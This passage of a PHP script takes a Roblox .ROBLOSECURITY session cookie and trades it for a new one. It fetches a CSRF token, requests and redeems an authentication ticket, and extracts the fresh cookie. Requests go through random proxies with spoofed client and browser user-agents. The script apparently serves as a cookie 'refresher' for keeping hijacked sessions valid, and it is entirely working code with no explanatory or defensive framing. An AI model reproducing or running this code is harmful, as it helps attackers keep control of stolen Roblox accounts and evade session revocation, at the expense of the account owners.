        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        $response = curl_exec($ch);
        $header_sz = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        curl_close($ch);

        $raw_headers = substr($response, 0, $header_sz);
        $csrf = null;
        foreach (explode("\r\n", $raw_headers) as $line) {
            if (stripos($line, "x-csrf-token:") === 0) {
                $csrf = trim(substr($line, strlen("x-csrf-token:")));
                break;
            };
        };

        if ($csrf) 
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/");
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["clientAssertion" => $client_assertion]));
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                "user-agent: Roblox/WinINet",
                "content-type: application/json",
                "referer: https://www.roblox.com/",
                "origin: https://www.roblox.com",
                "cookie: .ROBLOSECURITY=" . $cookie,
                "x-csrf-token: " . $csrf,
            ]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, true);
            $response = curl_exec($ch);
            $header_sz = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            curl_close($ch);

            $raw_headers = substr($response, 0, $header_sz);
            $auth_ticket = null;
            foreach (explode("\r\n", $raw_headers) as $line) {
                if (stripos($line, "rbx-authentication-ticket:") === 0) {
                    $auth_ticket = trim(substr($line, strlen("rbx-authentication-ticket:")));
                    break;
                };
            };

            if ($auth_ticket) 
            {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["authenticationTicket" => $auth_ticket]));
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                    "referer: https://www.roblox.com/",
                    "origin: https://www.roblox.com",
                    "content-type: application/json",
                    "rbxauthenticationnegotiation: 1",
                    "accept: application/json, text/plain, */*",
                    "accept-language: en-US,en;q=0.9",
                    "accept-encoding: gzip, deflate, br",
                    "connection: keep-alive",
                ]);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, true);
                curl_setopt($ch, CURLOPT_ENCODING, "");

                $new_cookie = null;
                $start_time = time();
                while (true) {
                    if ((time() - $start_time) >= 10) {
                        curl_close($ch);
                        return ["success" => false, "message" => "Timed Out"];
                    };
                    $response = curl_exec($ch);
                    $header_sz = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
                    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    $raw_headers = substr($response, 0, $header_sz);

                    if ($http_code === 429) {
                        $retry_after = 2;
                        foreach (explode("\r\n", $raw_headers) as $line) {
                            if (stripos($line, "retry-after:") === 0) {
                                $retry_after = (int) trim(substr($line, strlen("retry-after:")));
                                break;
                            };
                        };
                        sleep(min($retry_after, 10 - (time() - $start_time)));
                        continue;
                    };

                    if ($http_code === 200) {
                        foreach (explode("\r\n", $raw_headers) as $line) {
                            if (stripos($line, "set-cookie:") === 0) {
                                if (stripos($line, ".ROBLOSECURITY=") !== false) {
                                    preg_match('/.ROBLOSECURITY=([^;]+)/', $line, $matches);
                                    $new_cookie = $matches[1] ?? null;
                                    break;
                                };
                            };
                        };
                    };
                    break;
                };
                curl_close($ch);

                if ($new_cookie) return ["success" => true, "cookie" => $new_cookie];
            };
        };
    };

    $proxy = get_random_proxy();

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "user-agent: Roblox/WinINet",
        "content-type: application/json",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "cookie: .ROBLOSECURITY=" . $cookie,
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    apply_proxy($ch, $proxy);
    $response = curl_exec($ch);
    $header_sz = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);

    $raw_headers = substr($response, 0, $header_sz);
    $csrf = null;
    foreach (explode("\r\n", $raw_headers) as $line) {
        if (stripos($line, "x-csrf-token:") === 0) {
            $csrf = trim(substr($line, strlen("x-csrf-token:")));
            break;
        };
    };
    if (!$csrf) return ["success" => false, "message" => "Unknown Token"];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "user-agent: Roblox/WinINet",
        "content-type: application/json",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "cookie: .ROBLOSECURITY=" . $cookie,
        "x-csrf-token: " . $csrf,
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    apply_proxy($ch, $proxy);
    $response = curl_exec($ch);
    $header_sz = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);

    $raw_headers = substr($response, 0, $header_sz);
    $auth_ticket = null;
    foreach (explode("\r\n", $raw_headers) as $line) {
        if (stripos($line, "rbx-authentication-ticket:") === 0) {
            $auth_ticket = trim(substr($line, strlen("rbx-authentication-ticket:")));
            break;
        };
    };
    if (!$auth_ticket) return ["success" => false, "message" => "Unknown Ticket"];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["authenticationTicket" => $auth_ticket]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "content-type: application/json",
        "rbxauthenticationnegotiation: 1",
        "accept: application/json, text/plain, */*",
        "accept-language: en-US,en;q=0.9",
        "accept-encoding: gzip, deflate, br",
        "connection: keep-alive",
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_ENCODING, "");
    apply_proxy($ch, $proxy);

    $new_cookie = null;
    $start_time = time();
    while (true) {
        if ((time() - $start_time) >= 10) {
            curl_close($ch);
            return ["success" => false, "message" => "Timed Out"];
        };
        $response = curl_exec($ch);
        $header_sz = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $raw_headers = substr($response, 0, $header_sz);

        if ($http_code === 429) {
            $retry_after = 2;
            foreach (explode("\r\n", $raw_headers) as $line) {
                if (stripos($line, "retry-after:") === 0) {
                    $retry_after = (int) trim(substr($line, strlen("retry-after:")));
                    break;
                };
            };
            sleep(min($retry_after, 10 - (time() - $start_time)));
            continue;
        };

        if ($http_code !== 200) {
            curl_close($ch);
            return ["success" => false, "message" => "HTTP Error " . $http_code];
        };

        foreach (explode("\r\n", $raw_headers) as $line) {
            if (stripos($line, "set-cookie:") === 0) {
                if (stripos($line, ".ROBLOSECURITY=") !== false) {
                    preg_match('/.ROBLOSECURITY=([^;]+)/', $line, $matches);
                    $new_cookie = $matches[1] ?? null;
                    break;
                };
            };
        };
        break;
    };
    curl_close($ch);

    if (!$new_cookie) return ["success" => false, "message" => "Failed to extract new cookie"];
    return ["cookie" => $new_cookie];
};

connect();
?>